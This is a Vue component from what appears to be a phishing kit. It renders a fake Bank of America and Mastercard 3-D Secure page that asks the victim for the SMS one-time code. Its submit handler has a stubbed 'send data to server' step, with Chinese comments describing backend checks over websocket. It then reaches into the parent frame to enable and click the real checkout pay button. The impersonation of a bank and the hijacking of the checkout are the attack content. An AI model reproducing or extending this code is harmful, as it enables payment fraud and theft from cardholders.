<script setup lang="ts">
import LoadStripe from "~/components/phishing/loadings/LoadStripe.vue";
import {useLoadingStore} from "~/stores/loading";

definePageMeta({
  layout: false,
});

const loadingStore = useLoadingStore();

const mobile = "7878";
const bank = "Bank of America";
const money = "$250.00";
const date = "10/24/2024";
const code = ref('');

const submit = () => {
  console.log("hack?",top.window.hack)
  //1. 发送数据给服务器
  sendData();
  //2. loading
  // 后台判断是否通过， 交由websocket去互动

  //TODO  3. 通过则重新点击按钮  这个也要交给websocket去互动
  resubmit();
}
function sendData() {
  //发送数据给服务器
  console.log("======发送数据给服务器")
}


function resubmit() {
  console.log("======真实提交")
  const btn = top.document.getElementById("checkout-pay-button");
  btn.disabled=false;
  btn.click();
  top.window.hack = false;
}


</script>

<template>
  <div class="threeds-container">
    <div class="threeds-header">
        <img src="@/assets/img/Bank%20of%20American.svg" alt="Bank" class="bank-logo" />
        <img src="@/assets/img/mastercard-logo.png" class="gateway-logo" />
    </div>
    <div class="threeds-body">
      <h2>Payment security</h2>
      <p>We have sent you a text message with a code to your registered mobile number ending in <span class="strong">{{mobile}}</span></p>

      <p>You are paying <span class="strong">{{bank}}</span> the amount of <span class="strong">{{money}}</span> on <span class="strong">{{date}}</span></p>

      <h4>Enter your code below:</h4>

      <div><input type="text" v-model="code"/></div>

      <button class="btn btn-a" @click="submit">SUBMIT</button>
      <button class="btn btn-b">RESEND CODE</button>

    </div>
    <div class="3ds-footer">
      > learn more about authentication
      > Need some help?
    </div>

  </div>
</template>

<style scoped>

.threeds-container {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
  font-size: 18px;

  color: #475e80;

  width: 100%;
  box-sizing: border-box;
  padding: 0 16px 0 16px;

  .threeds-header{
    display: flex;
    height: 80px;
    box-sizing: border-box;
    padding: 12px 0 12px 0;
    justify-content: space-between;
  }

  .threeds-body{
    padding: 24px 0 24px 0;
    h2,h4{
      color:#2c3f5c;
    }
    h4{
      margin-bottom:0;
    }
    input{
      all: unset;
      width: 100%;
      border: 1px solid #cfd3d8;
      text-align: center;
      height: 40px;
      font-size: 20px;
      color: #475e80;
      box-sizing: border-box;
    }
    .strong{
      font-weight: bold;
    }
    .btn{
      width: 100%;
      height: 48px;
      border-radius: 5px;
      box-sizing: border-box;
      font-weight: bold;
    }
    .btn-a{
      color:white;
      background-color: #31AA4C;
      border: none;
      margin-top:20px
    }
    .btn-b{
      color:#31AA4C;
      background-color: white;
      border: 1px solid #31AA4C;
      margin-top: 12px;
    }


  }
}

</style>